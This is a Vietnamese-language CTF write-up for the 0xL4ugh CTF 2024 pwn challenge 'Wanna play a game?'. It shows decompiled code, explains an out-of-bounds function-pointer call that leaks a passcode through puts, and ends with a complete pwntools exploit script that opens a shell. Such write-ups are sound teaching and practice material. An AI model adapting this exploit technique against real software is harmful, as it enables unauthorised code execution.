---
title: [WRITE UP] - 0xL4ugh CTF 2024 - Wanna play a game?
published: 2024-12-01
description: "Write up for Wanna play a game challenge"
tags: ["PWN"]
category: CTF Writeups
draft: false
---
## General Infomation

```c
[*] '/home/alter/CTFs/0xlaugh/pwn/wanna_play_a_game/public/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

- **main()**

    ```c
    int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
    {
      __int64 v3; // [rsp+0h] [rbp-10h]
      __int64 v4; // [rsp+8h] [rbp-8h]

      setup(argc, argv, envp);
      printf("[*] NickName> ");
      if ( read(0, &username, 0x40uLL) == -1 )
      {
        perror("READ ERROR");
        exit(-1);
      }
      while ( 1 )
      {
        menu();
        v3 = read_int();
        printf("[*] Guess>");
        v4 = read_int();
        ((void (__fastcall *)(__int64))conv[v3 - 1])(v4);
      }
    }

    ```

- **easy()**

    ```c
    int __fastcall easy(__int64 a1)
    {
      if ( a1 == rand() )
        return printf("[+] NICE GUESS!!\n[*] Current Score: %lu\n", score);
      else
        return puts("[-] WRONG GUESS :(");
    }
    ```

- **hard()**

    ```csharp
    unsigned __int64 __fastcall hard(__int64 a1)
    {
      int i; // [rsp+14h] [rbp-2Ch]
      char path[8]; // [rsp+2Fh] [rbp-11h] BYREF
      char v4; // [rsp+37h] [rbp-9h]
      unsigned __int64 v5; // [rsp+38h] [rbp-8h]

      v5 = __readfsqword(0x28u);
      strcpy(path, "<qz}<`{");
      v4 = 0;
      for ( i = 0; i <= 6; ++i )
        path[i] ^= 0x13u;
      if ( a1 == passcode )
      {
        puts("[+] WINNNN!");
        execve(path, 0LL, 0LL);
      }
      else
      {
        puts("[-] YOU ARE NOT WORTHY FOR A SHELL!");
      }
      change_passcode();
      return v5 - __readfsqword(0x28u);
    }
    ```

- **read_int()**

    ```c
    __int64 read_int()
    {
      __int64 buf[6]; // [rsp+0h] [rbp-30h] BYREF

      buf[5] = __readfsqword(0x28u);
      memset(buf, 0, 32);
      printf("> ");
      if ( read(0, buf, 0x20uLL) == -1 )
      {
        perror("READ ERROR");
        exit(-1);
      }
      return atol((const char *)buf);
    }
    ```

- **change_passcode()**

    ```c
    int change_passcode()
    {
      int fd; // [rsp+Ch] [rbp-4h]

      fd = open("/dev/random", 0);
      if ( fd < 0 )
      {
        perror("OPEN ERROR");
        exit(-1);
      }
      if ( read(fd, &passcode, 8uLL) == -1 )
      {
        perror("READ ERROR");
        exit(-1);
      }
      puts("[*] PASSCODE CHANGED!");
      return close(fd);
    }
    ```


Flow của ELF được cấu trúc như sau:

1. **Nhập username**: Người dùng nhập tên của mình.
2. **Chọn chức năng**: Người dùng chọn một trong hai chế độ (`easy` hoặc `hard`).
3. **Nhập số để đoán**: Người dùng nhập giá trị dự đoán.
4. **Gọi hàm tương ứng**: Chế độ được chọn (`easy` hoặc `hard`) sẽ được gọi thông qua mảng `conv[]`.
5. **Quay lại bước 2**: Chu trình tiếp tục lặp lại.

Khi phân tích qua mã decompile, ta thấy rằng cả `username` và mảng `conv[]` đều được khởi tạo trước khi hàm `main` chạy và nằm trong `.data` section. Với điều kiện **No PIE** (Position Independent Executable bị tắt), địa chỉ của các biến này là cố định. Điều này cho phép ta kiểm soát hoặc tận dụng một trong hai (hoặc cả hai) biến để khai thác chương trình, mở ra nhiều khả năng tấn công dựa trên việc thao túng `.data` section.

Tại `conv` :

```nasm
.data:0000000000404010                 public conv
.data:0000000000404010 conv            dq offset easy          ; DATA XREF: main+A8↑o
.data:0000000000404010                                         ; main+AF↑r
.data:0000000000404010                 dq offset hard
```

Mảng `conv[]` chứa hai địa chỉ hàm: `easy` và `hard`. Khi người dùng chọn chế độ, chương trình sẽ gọi hàm tương ứng thông qua `conv` bằng cách sử dụng cú pháp `conv[input - 1](v4)`. Ở đây, `input - 1` xác định index trong mảng `conv`, tương ứng với `1` (easy - index `0`) và `2` (hard - index `1`). Biến `v4` được truyền làm tham số cho hàm được gọi. Cách triển khai này phụ thuộc hoàn toàn vào giá trị nhập từ người dùng để xác định hàm nào sẽ được thực thi, tạo cơ hội cho việc khai thác nếu người dùng có thể kiểm soát hoặc ghi đè dữ liệu trong mảng `conv`

Như vậy, chương trình tồn tại lỗi **Out-Of-Bounds (OOB)** khi gọi `conv[input - 1](v4)` mà không kiểm tra giá trị của `input`. Điều này cho phép người dùng nhập các giá trị ngoài phạm vi hợp lệ (khác 1 và 2), dẫn đến việc gọi địa chỉ bất kỳ. Kết hợp với khả năng kiểm soát biến `username`, ta có thể chỉnh sửa nội dung của `username` để chứa một địa chỉ hợp lệ. Sau đó, chương trình có thể bị điều hướng để gọi vào địa chỉ đó, mở ra khả năng khai thác. Bên cạnh đó còn có **Bad Seed khi** chương trình sử dụng `srand(time(0))` để tạo seed cho việc sinh passcode ngẫu nhiên. Tuy nhiên, với `rand()`, giá trị này có thể được dự đoán nếu thời gian chạy chương trình được biết. Dù vậy, tính năng này chỉ được sử dụng trong chế độ `easy`, và không có ý nghĩa quan trọng trong khai thác hiện tại nên có thể bỏ qua.

## Leak libc

Theo intended solution, mục tiêu là nhập đúng passcode mà binary đã khởi tạo mỗi khi chạy `main`. Để đạt được điều này, ta có thể lợi dụng hàm `puts(char *s)` để leak dữ liệu từ biến `passcode`. Vì `passcode` được khởi tạo trước khi `main` chạy và nằm trong `.data` section, ta có thể khai thác bằng cách làm như sau:

1. **Chọn địa chỉ cần leak**: Biến `passcode` có địa chỉ cố định (do No PIE), và nội dung của nó có thể được truy cập trực tiếp.
2. **Gọi `puts` với địa chỉ tùy chỉnh**: Bằng cách điều hướng một hàm hoặc mảng (như `conv[]`) để gọi `puts` với tham số là địa chỉ của `passcode`, chương trình sẽ in ra giá trị của nó.

```python
passcode_address = 0x404060
puts_plt = exe.plt.puts

sa(b'[*] NickName> ', p64(puts_plt))
sla(b'> ', b'15') # offset / 8 từ conv -> passcode
sa(b'>', str(passcode_address).encode())

ru(b'> ')
# print(ru(b'\n'))
passcode = u64(ru(b'\n').strip())
print(f'Passcode leak: {passcode}')
```

## Get shell

Nhập `passcode` ta leak được là đã có được shell:

```python
sla(b'> ', b'2')
sa(b'>', str(passcode).encode())
```

- Full payload

    ```python
    #!/usr/bin/python3
    from pwncus import *

    # context.log_level = 'debug'
    exe = context.binary = ELF('./chall', checksec=False)

    def GDB(): gdb.attach(p, gdbscript='''

    c
    ''') if not args.REMOTE else None

    p = remote('', ) if args.REMOTE else process(argv=[exe.path], aslr=False)
    set_p(p)
    if args.GDB: GDB(); input()

    # ===========================================================
    #                          EXPLOIT
    # ===========================================================

    passcode_address = 0x404060
    puts_plt = exe.plt.puts

    sa(b'[*] NickName> ', p64(puts_plt))
    sla(b'> ', b'15')
    sa(b'>', str(passcode_address).encode())

    ru(b'> ')
    # print(ru(b'\n'))
    passcode = u64(ru(b'\n').strip())
    print(f'Passcode leak: {passcode}')

    sla(b'> ', b'2')
    sa(b'>', str(passcode).encode())
    interactive()
    ```
